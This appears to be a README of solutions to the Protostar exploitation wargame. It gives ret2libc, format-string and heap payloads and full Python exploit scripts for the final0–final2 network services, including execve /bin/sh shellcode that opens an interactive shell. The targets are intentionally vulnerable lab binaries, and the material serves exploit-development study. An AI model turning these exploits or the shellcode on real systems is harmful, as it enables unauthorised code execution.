# Protostar

## Stack
- [x] stack0
- [x] stack1
- [x] stack2
- [x] stack3
- [x] stack4
- [x] stack5
- [x] stack6
- [x] stack7
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
return_op = struct.pack("I",0x08048544)
call_system = struct.pack("I",0xb7ecffb0)
after_system_execution = struct.pack("I",0xb7ec60c0)
bin_sh_path = struct.pack("I",0xb7fb63bf)
print padding + return_op + call_system + after_system_execution + bin_sh_path
```

## Format String
- [x] format0
- [x] format1
- [x] format2
```
%n4u (replace 4 with additional data you want for %n )
```
- [x] format3
- [x] format4

## Heap
- [x] heap0
- [x] heap1
```
./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
```
- [x] heap2
```
exploiting use-after-free bug
```
- [x] heap3
```
need to create a fake chunk and unlink it explictly
then forward & backward pointer is abused to write change the PLT

hence executing the winner function
```

## Network

- [x] net0
```
echo -ne "`cat -`" | nc 127.0.0.1 2999

to enter the little endian string
```
- [x] net1
- [x] net2

## Final
- [x] final0
```
import struct
import socket
import telnetlib

HOST='127.0.0.1'
PORT=2995

padding = "A"*500+"\x00"+"aaaabbbbccccddddeeeeffffgggghhh"
execv = struct.pack("I",0x08048c0c)
execv_ret = "AAAA"
execv_param =  struct.pack("I",1176511+0xb7e97000)#bin/sh address

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))


exploit = padding+execv+execv_ret+execv_param+"\x00"*8

s.send(exploit+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
```
- [x] final1
```
import struct
import socket
import telnetlib

HOST='127.0.0.1'
PORT=2994


def read_until(check):
    buffer=''
    while check not in buffer:
        buffer += s.recv(1)
    return buffer


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

# GOT -> 0x804a1b4
# system offset -> 0xb7ecffb0

strcmp = struct.pack("I",0x804a1a8)
strcmp2 = struct.pack("I",0x804a1a8+2)
ip,port = s.getsockname()

hostname = ip+":"+str(port)
padding_a = "A"*(24-len(hostname))

username = padding_a+'BBBB'+strcmp+'DDDD'+strcmp2+'%17$65399x %18$08n %19$47162x %20$08n'
#username = padding_a + 'BBBB' + strcmp + '%17$65407x %18$08nAA' + strcmp2 + '%22$47157x %24$04n'

password="CCCC"

print read_until("[final1] $ ")
raw_input('Waiting for input..')
s.send("username "+username+"\n")
print read_until("[final1] $ ")
s.send("login "+password+"\n")
print read_until("[final1] $ ")
raw_input('Waiting for input..')

t = telnetlib.Telnet()
t.sock = s
t.interact()
```
- [x] final2
```
import struct
import socket
import telnetlib

REQUZ=128

HOST="127.0.0.1"
PORT=2993

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

def padding(msg):
    pad = '\x00'*(REQUZ-len(msg))
    _msg = "FSRD"+msg+pad
    return _msg[:REQUZ]

malloc_vudoo=struct.pack("I",0xfffffffc)
fake_chunk = malloc_vudoo+malloc_vudoo
fake_chunk += struct.pack("I",0x804d41c-0xc) # GOT of write
fake_chunk += struct.pack("I",0x804e020) # Address of heap

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

short_jump_10 = "\xeb\x0e"

#s.send(padding("/ROOT///"+"/"*12+short_jump_10+"AABBBBCCCCDDDD"+"\xCC"*12+"/"*128))
s.send(padding("/ROOT///"+"/"*12+short_jump_10+"AABBBBCCCCDDDD"+shellcode+"/"*128))
s.send(padding("ROOT/"+fake_chunk))

while True:
    msg = raw_input("> ")
    if msg:
        print("MSG: "+repr(padding(msg)))
        s.send(padding(msg))
    else:
        break

s.send("id")
print s.recv(1024)
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

## Create a Binary with no stack canary, executable stack and no PIE (Position Independent Code)
```
gcc <input> -o <output> -fno-stack-protector -z execstack -no-pie
```

## Using socat on binary file
attaching binary to the port
```
socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./<Program name>"
```

# Reference
- https://old.liveoverflow.com/binary_hacking/protostar/index.html
- https://exploit.education/protostar/
- https://ctf101.org/binary-exploitation/overview/

# Writeup & Video
- https://kevinalmansa.github.io/write-ups/Protostar-Stack-Write-up/
- https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- https://failingsilently.wordpress.com/exploit-development/
- https://www.ayrx.me/protostar-walkthrough-format ( format string writeup )

# Tools
- https://github.com/inaz2/roputils
- https://github.com/JonathanSalwan/ROPgadget
